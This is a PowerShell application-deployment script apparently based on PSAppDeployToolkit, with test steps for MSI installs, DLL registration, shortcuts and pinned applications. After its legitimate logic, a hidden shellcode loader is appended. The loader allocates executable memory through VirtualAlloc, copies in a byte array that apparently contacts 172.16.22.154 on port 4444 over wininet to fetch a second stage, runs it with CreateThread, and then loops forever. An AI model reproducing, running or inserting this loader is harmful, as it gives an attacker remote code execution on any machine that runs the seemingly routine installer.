
[CmdletBinding()]
Param (
	[Parameter(Mandatory=$false)]
	[ValidateSet('Install','Uninstall')] 
	[string]$DeploymentType = 'Install',
	[Parameter(Mandatory=$false)]
	[ValidateSet('Interactive','Silent','NonInteractive')]
	[string]$DeployMode = 'Interactive',
	[Parameter(Mandatory=$false)]
	[switch]$AllowRebootPassThru = $false,
	[Parameter(Mandatory=$false)]
	[switch]$TerminalServerMode = $false
)

Try {
	
	Try { Set-ExecutionPolicy -ExecutionPolicy 'ByPass' -Scope 'Process' -Force -ErrorAction 'Stop' } Catch {}
	
	
	
	
	
	
	[scriptblock]$Variables_Application = {
		[string]$appVendor = 'PSAppDeployToolkit'
		[string]$appName = 'Test Script'
		[string]$appVersion = '1.0'
		[string]$appArch = ''
		[string]$appLang = 'EN'
		[string]$appRevision = '01'
		[string]$appScriptVersion = '3.5.0'
		[string]$appScriptDate = '11/03/2014'
		[string]$appScriptAuthor = 'Dan Cunningham'
	}
	.$Variables_Application
	
	
	[scriptblock]$Variables_AllScriptParams = {
		[string]$DeploymentType = $DeploymentType
		[string]$DeployMode = $DeployMode
		[switch]$AllowRebootPassThru = $AllowRebootPassThru
		[switch]$TerminalServerMode = $TerminalServerMode
	}
	
	
	
	
	
	
	[int32]$mainExitCode = 0
	
	
	$script:mainPSBoundParams = $PSBoundParameters
	[scriptblock]$Variables_Script = {
		
		[string]$deployAppScriptFriendlyName = 'Deploy Application'
		[version]$deployAppScriptVersion = [version]'4.0.0'
		[string]$deployAppScriptDate = '11/12/2014'
		
		[hashtable]$deployAppScriptParameters = $script:mainPSBoundParams
	}
	.$Variables_Script
	
	
	Try {
		[string]$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
		[string]$moduleAppDeployToolkitMain = "$scriptDirectory\AppDeployToolkit\AppDeployToolkitMain.ps1"
		If (-not (Test-Path -Path $moduleAppDeployToolkitMain -PathType Leaf)) { Throw "Module does not exist at the specified location [$moduleAppDeployToolkitMain]." }
		. $moduleAppDeployToolkitMain
	}
	Catch {
		[int32]$mainExitCode = 1
		Write-Error -Message "Module [$moduleAppDeployToolkitMain] failed to load: `n$($_.Exception.Message)`n `n$($_.InvocationInfo.PositionMessage)" -ErrorAction 'Continue'
		Exit $mainExitCode
	}
	
	
	
	
	
	
	
	
	
	If ($deploymentType -ine 'Uninstall') {
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Pre-Installation' }; .$Variables_InstallPhase
		
		
		Show-InstallationWelcome -AllowDefer -DeferTimes 100
		
		
		
		Show-InstallationWelcome -CloseApps 'iexplore' -CloseAppsCountdown 60 -CheckDiskSpace -PersistPrompt -BlockExecution
		
		
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Installation' }; .$Variables_InstallPhase
		
		
		Show-InstallationProgress -StatusMessage 'BlockExecution Test: Open Internet Explorer or an Office application within 10 seconds...'
		Start-Sleep -Seconds 10
		
		
		Show-InstallationProgress -StatusMessage 'MSI Installation And Removal Test...'
		Execute-MSI -Action Install -Path 'PSAppDeployToolkit_TestInstallation_1.0.0_EN_01.msi'
		Remove-MSIApplications -Name 'Test Installation (Testing) [Testing]'
		
		
		Show-InstallationProgress -StatusMessage 'x86 File Manipulation And DLL Registration Test...'
		Copy-File -Path "$dirSupportFiles\AutoItX3.dll" -Destination "$envWinDir\SysWOW64\AutoItx3.dll"
		Register-DLL -FilePath "$envWinDir\SysWOW64\AutoItx3.dll"
		Unregister-DLL -FilePath "$envWinDir\SysWOW64\AutoItx3.dll"
		Remove-File -Path "$envWinDir\SysWOW64\AutoItx3.dll"
		
		
		Show-InstallationProgress -StatusMessage 'x64 File Manipulation And DLL Registration Test...'
		Copy-File -Path "$dirSupportFiles\AutoItX3_x64.dll" -Destination "$envWinDir\System32\AutoItx3.dll"
		Register-DLL -FilePath "$envWinDir\System32\AutoItx3.dll"
		Unregister-DLL -FilePath "$envWinDir\System32\AutoItx3.dll"
		Remove-File -Path "$envWinDir\System32\AutoItx3.dll"
		
		
		Show-InstallationProgress -StatusMessage 'Shortcut Creation Test...'
		New-Shortcut -Path "$envProgramData\Microsoft\Windows\Start Menu\My Shortcut.lnk" -TargetPath "$envWinDir\system32\notepad.exe" -IconLocation "$envWinDir\system32\notepad.exe" -Description 'Notepad' -WorkingDirectory "$envHomeDrive\$envHomePath"
		
		
		Show-InstallationProgress -StatusMessage 'Pinned Application Test...'
		Set-PinnedApplication -Action 'PintoStartMenu' -FilePath "$envWinDir\Notepad.exe"
		Set-PinnedApplication -Action 'PintoTaskBar' -FilePath "$envWinDir\Notepad.exe"
		
		
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Post-Installation' }; .$Variables_InstallPhase
		
		
		Show-InstallationProgress -StatusMessage 'Execute Process Test: Close Notepad to proceed...'
		If (-not $IsProcessUserInteractive) {
			Invoke-PSCommandAsUser -Command { Execute-Process -FilePath 'Notepad' }
		}
		Else {
			Execute-Process -FilePath 'Notepad'
		}
		
		
		Show-InstallationPrompt -Message 'Asynchronous Installation Prompt Test: The installation should complete in the background. Click OK to dismiss...' -ButtonRightText 'OK' -Icon 'Information' -NoWait
		Start-Sleep -Seconds 10
		
		
		Remove-File -Path "$envProgramData\Microsoft\Windows\Start Menu\My Shortcut.lnk"
		
		
		Set-PinnedApplication -Action 'UnPinFromStartMenu' -FilePath "$envWinDir\Notepad.exe"
		Set-PinnedApplication -Action 'UnPinFromTaskBar' -FilePath "$envWinDir\Notepad.exe"
		
		

	}
	ElseIf ($deploymentType -ieq 'Uninstall') {
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Post-Uninstallation' }; .$Variables_InstallPhase
		
		
		Show-InstallationWelcome -CloseApps 'iexplore' -CloseAppsCountdown 60
		
		
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Uninstallation' }; .$Variables_InstallPhase
		
		
		Show-InstallationProgress -StatusMessage 'MSI Uninstallation Test...'
		Execute-MSI -Action Uninstall -Path 'PSAppDeployToolkit_TestInstallation_1.0.0_EN_01.msi'
		
		
		
		
		
		[scriptblock]$Variables_InstallPhase = { [string]$installPhase = 'Post-Uninstallation' }; .$Variables_InstallPhase
		
		
	}
	
	
	
	
	
	
	
	Exit-Script -ExitCode $mainExitCode
}
Catch {
	[int32]$mainExitCode = 1
	[string]$mainErrorMessage = "$(Resolve-Error)"
	Write-Log -Message $mainErrorMessage -Severity 3 -Source $deployAppScriptFriendlyName
	Show-DialogBox -Text $mainErrorMessage -Icon 'Stop' | Out-Null
	Exit-Script -ExitCode $mainExitCode
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x6a,0x08,0x5f,0x31,0xdb,0x89,0xf9,0x53,0xe2,0xfd,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x6a,0x03,0x53,0x53,0x68,0x5c,0x11,0x00,0x00,0xe8,0x86,0x00,0x00,0x00,0x2f,0x31,0x4c,0x79,0x66,0x00,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x7b,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x31,0x36,0x2e,0x32,0x32,0x2e,0x31,0x35,0x34,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

